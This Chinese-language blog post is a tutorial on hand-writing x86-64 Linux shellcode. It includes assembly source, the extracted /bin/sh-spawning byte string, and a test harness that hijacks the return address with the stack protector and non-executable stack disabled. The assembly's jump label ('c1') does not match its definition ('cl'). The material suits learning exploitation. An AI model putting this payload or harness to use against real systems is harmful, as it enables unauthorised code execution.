---
layout: default
title: shellcode_notes
categories:
- C++
tags:
- C++
---
//Description: how to write shellcode. 搜索到的基本上是x86的，少数x64的在自己的机器上也不管用，只有根据自己机器的实际情况自行写一遍。

//Create Date: 2020-04-15 15:43:04

//Author: channy

# shellcode_notes

## 1. 写源码

```c++
//shellcode.c
#include <stdio.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
	char *buf[2];
	buf[0] = "/bin/sh";
	buf[1] = NULL;
        execve(buf[0], buf, 0);
        return 0;
}
```

## 2. 反编译

```
gcc -o shellcode shellcode.c 
objdump -d shellcode > shellcode.s
```

## 3. 关注反编译中main部分

```
00000000000006aa <main>:
 6aa:   55                      push   %rbp
 6ab:   48 89 e5                mov    %rsp,%rbp
 6ae:   48 83 ec 30             sub    $0x30,%rsp
 6b2:   89 7d dc                mov    %edi,-0x24(%rbp)
 6b5:   48 89 75 d0             mov    %rsi,-0x30(%rbp)
 6b9:   64 48 8b 04 25 28 00    mov    %fs:0x28,%rax
 6c0:   00 00  
 6c2:   48 89 45 f8             mov    %rax,-0x8(%rbp)
 6c6:   31 c0                   xor    %eax,%eax
 6c8:   48 8d 05 c5 00 00 00    lea    0xc5(%rip),%rax        # 794 <_IO_stdin_used+0x4>
 6cf:   48 89 45 e0             mov    %rax,-0x20(%rbp)
 6d3:   48 c7 45 e8 00 00 00    movq   $0x0,-0x18(%rbp)
 6da:   00  
 6db:   48 8b 45 e0             mov    -0x20(%rbp),%rax
 6df:   48 8d 4d e0             lea    -0x20(%rbp),%rcx
 6e3:   ba 00 00 00 00          mov    $0x0,%edx
 6e8:   48 89 ce                mov    %rcx,%rsi
 6eb:   48 89 c7                mov    %rax,%rdi
 6ee:   e8 8d fe ff ff          callq  580 <execve@plt>
 6f3:   b8 00 00 00 00          mov    $0x0,%eax
 6f8:   48 8b 55 f8             mov    -0x8(%rbp),%rdx
 6fc:   64 48 33 14 25 28 00    xor    %fs:0x28,%rdx
 703:   00 00  
 705:   74 05                   je     70c <main+0x62>
 707:   e8 64 fe ff ff          callq  570 <__stack_chk_fail@plt>
 70c:   c9                      leaveq 
 70d:   c3                      retq   
 70e:   66 90                   xchg   %ax,%ax
```

从这步开始就和搜索到的大部分文章不一样了

## 4. 重写汇编

```
//scode.s
.section .text
.global _start
_start:
jmp c1
pp: popq %rcx #将字符串"/bin/sh"的地址存入rcx（通用寄存器），这里可以选择其它寄存器。
pushq %rbp #接下来的三条指令是建立一个新的栈空间
mov %rsp, %rbp
subq $0x30, %rsp
movq %rcx, -0x20(%rbp) #将字符串复制到栈
movq $0x0,-0x18(%rbp) #创建调用exec时的参数name[1]，将它置0.
mov $0, %edx
lea -0x20(%rbp), %rsi #这是execve第二个参数，它需要**类型，所以用lea传送地址给rsi。
mov -0x20(%rbp), %rdi #mov将字符串传给rdi，这是execve第一个参数。
mov $59, %rax #这个59是execve的系统调用号，在/usr/include/asm/unistd_64.h里可以查询到.
syscall #系统调用， 这个可以取代 int 0x80
cl: call pp

.ascii "/bin/sh"
```

然而自己的机器上include里面并没有asm/unistd_64.h文件
```
// /usr/include/asm-generic/unistd.h
607 #define __NR_execve 221
608 __SC_COMP(__NR_execve, sys_execve, compat_sys_execve)
```

```
// /usr/include/x86_64-linux-gnu/asm/unistd_64.h
63 #define __NR_execve 59
```

[reference](https://www.jianshu.com/p/5d1b1eafca21)

## 5. 编译和连接

```
as -o scode.o scode.s
ld -o scode scode.o
```

objdump反汇编scode，提取shellcode

```
for i in $(objdump -d scode | grep "^ " |cut -f2); do echo -n '\x'$i; done;
```

最后得到shellcode

```
\xeb\x2b\x59\x55\x48\x89\xe5\x48\x83\xec\x30\x48\x89\x4d\xe0\x48\xc7\x45\xe8\x00\x00\x00\x00\xba\x00\x00\x00\x00\x48\x8d\x75\xe0\x48\x8b\x7d\xe0\x48\xc7\xc0\x3b\x00\x00\x00\x0f\x05\xe8\xd0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68
```

## 6. 验证

```c++
#include <stdio.h>

unsigned char code[] = "\xeb\x2b\x59\x55\x48\x89\xe5\x48\x83\xec\x30\x48\x89\x4d\xe0\x48\xc7\x45\xe8\x00\x00\x00\x00\xba\x00\x00\x00\x00\x48\x8d\x75\xe0\x48\x8b\x7d\xe0\x48\xc7\xc0\x3b\x00\x00\x00\x0f\x05\xe8\xd0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";

void main(int argc, char *argv[])
{ 
    long *ret; 
    ret = (long *)&ret + 2;  
    (*ret) = (long)code;
}
```

```
gcc shellcodeTest.c -o shellcodeTest -fno-stack-protector -z execstack
```

能够正常运行
```
ity$ ./shellcodeTest 
$ whoami
channy
```

[back](/)

